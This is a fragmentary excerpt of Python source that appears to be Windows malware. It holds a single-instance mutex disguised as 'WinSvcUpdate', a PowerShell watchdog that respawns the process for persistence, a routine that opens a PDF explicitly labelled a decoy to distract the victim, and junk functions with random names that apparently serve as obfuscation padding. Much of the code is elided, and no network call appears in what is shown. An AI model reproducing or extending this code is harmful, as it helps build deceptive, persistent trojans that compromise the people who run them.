...
# 10 — Mutex Singleton (static name prevents multiple instances)
def _create_mutex():
    global _immortality_mutex
    try:
        name = "Global\\WinSvcUpdate"
        _immortality_mutex = _K32.CreateMutexW(None, False, name)
        if _K32.GetLastError() == 183:
            _K32.CloseHandle(_immortality_mutex)
            _immortality_mutex = None
            _log("Mutex exists — another instance is running, exiting")
            return False
        _log("Mutex acquired — single instance confirmed")
        return True
    except:
        return True

# 1 — Watchdog (PowerShell-based, no file written)
_WATCHDOG_LOCK = os.path.join(os.environ.get("TEMP", "."), ".wd_lock")

def _start_watchdog():
    try:
        # Remove lock file so watchdog knows to respawn
        try:
            if os.path.exists(_WATCHDOG_LOCK):
                os.remove(_WATCHDOG_LOCK)
        except:
            pass
        ppid = os.getpid()
        exe = sys.executable.replace("'", "''")
        lock = _WATCHDOG_LOCK.replace("'", "''")
        script = (
            "$p=" + str(ppid) + ";$e='" + exe + "';$lk='" + lock + "';"
            "while(1){"
    ...
    try:
        ...
        for _d in _dirs:
            if not _d or not os.path.isdir(_d):
                continue
            for _pdf in _glob.glob(os.path.join(_d, "*.pdf")):
                try:
                    os.startfile(_pdf)
                    _log(f"PDF decoy opened: {_pdf}")
                    return
                except Exception:
                    try:
                        subprocess.Popen(["cmd.exe", "/c", "start", "", _pdf],
                                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                        _log(f"PDF decoy opened via cmd: {_pdf}")
                        return
                    except Exception:
                        pass
    except Exception:
...
if __name__ == "__main__":
    _open_pdf_decoy()
    check_lock_state()
    # Create watchdog lock file — watchdog checks this before respawning
    try:
        with open(_WATCHDOG_LOCK, "w") as _f:
    ...
    while True:
        ...
        try:
            ...
            _loop.close()
        time.sleep(2)
    # Clean exit — remove lock so watchdog doesn't respawn
    try:
        if os.path.exists(_WATCHDOG_LOCK):
            os.remove(_WATCHDOG_LOCK)
    except:
...
def _ldkljbdt():
    _62572 = 63; _12184 = 20; _52952 = 66

def _kezumfbn():
    _44796 = 128; _4564 = 29; _27026 = 171
